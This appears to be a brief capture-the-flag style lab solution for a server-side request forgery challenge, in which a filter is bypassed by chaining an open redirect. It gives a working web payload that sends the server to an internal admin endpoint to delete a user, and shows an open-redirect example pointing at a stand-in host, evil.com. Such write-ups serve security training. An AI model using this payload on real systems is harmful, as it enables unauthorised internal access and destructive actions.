# SSRF with filter bypass via open redirection vulnerability
Solution:
- There is an open redirect at /product/nextProduct?currentProductId=3&path=http://evil.com
- Use this payload
 ```js
 stockApi=/product/nextProduct?currentProductId=3%26path=http://192.168.0.12:8080/admin/delete?username=carlos#?productId=4
 ```